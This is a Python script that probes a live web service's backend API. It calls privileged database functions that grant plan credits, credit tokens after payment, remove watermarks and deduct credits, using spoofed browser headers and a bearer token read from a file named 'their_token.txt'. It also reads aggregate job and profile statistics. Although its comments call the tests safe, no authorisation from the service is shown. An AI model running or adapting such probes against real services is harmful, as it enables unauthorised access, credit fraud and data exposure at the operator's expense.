#!/usr/bin/env python3
# Safe end-to-end callability tests for SECURITY DEFINER RPCs whose signatures we recovered.
# Uses nonexistent target UUIDs so no real rows can be modified; separately tests with our own
# disposable test account only where explicitly noted.
import json, sys, time, urllib.request, urllib.error
sys.stdout.reconfigure(encoding="utf-8")
BASE = "https://cdn.onlyfakeai.ru"
PK = "<publishable-key>"
TA = json.load(open("their_token.txt"))["access_token"]
NIL = "00000000-0000-0000-0000-000000000000"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def call(method, path, body=None, token=None):
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
         "Accept-Language": "en-US,en;q=0.9", "Origin": "https://onlyfakeai.ru",
         "Referer": "https://onlyfakeai.ru/", "apikey": PK}
    if token: h["Authorization"] = "Bearer " + token
    data = json.dumps(body).encode() if body is not None else None
    if data is not None: h["Content-Type"] = "application/json"
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, resp.read(4000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(4000).decode("utf-8", "replace")
    except Exception as e:
        return "ERR", repr(e)

def rpc(fn, args, token=None):
    st, b = call("POST", f"/rest/v1/rpc/{fn}", body=args, token=token)
    print(f"\n>>> {fn} {list(args)} token={'user' if token else 'anon'} -> {st}\n{b[:800]}")
    time.sleep(0.6)
    return st, b

print("=== A. callability with nonexistent target id (cannot modify real data) ===")
rpc("grant_plan_credits", {"p_plan_key": "free", "p_user_id": NIL})
rpc("grant_plan_credits", {"p_plan_key": "free", "p_user_id": NIL}, token=TA)
rpc("credit_tokens_after_payment", {"p_generations": 0, "p_plan_key": "free", "p_user_id": NIL})
rpc("credit_tokens_after_payment", {"p_generations": 0, "p_plan_key": "free", "p_user_id": NIL}, token=TA)
rpc("remove_watermark_and_deduct_token", {"p_generations_left": 0, "p_job_id": "1", "p_user_id": NIL})
rpc("remove_watermark_and_deduct_token", {"p_generations_left": 0, "p_job_id": "1", "p_user_id": NIL}, token=TA)
rpc("deduct_generation", {"p_user_id": NIL}, token=TA)
rpc("deduct_credits", {"p_amount": 0, "p_user_id": NIL}, token=TA)

print("\n=== B. read-only series functions with recovered args ===")
st, b = call("GET", "/rest/v1/rpc/get_jobs_time_series?date_trunc_type=day&start_date=2026-11-01")
print(f"\n>>> get_jobs_time_series(day, 2026-11-01) -> {st}\n{b[:1500]}")
time.sleep(0.5)
st, b = call("GET", "/rest/v1/rpc/get_profiles_time_series?date_trunc_type=day&start_date=2026-11-01")
print(f"\n>>> get_profiles_time_series(day, 2026-11-01) -> {st}\n{b[:1500]}")

print("\n=== C. profile state of our test account (before/after any grant attempt) ===")
st, b = call("GET", "/rest/v1/profiles?select=activePlan,generations_left,role", token=TA)
print(f"own profile -> {st} {b[:400]}")

print("\ndone")
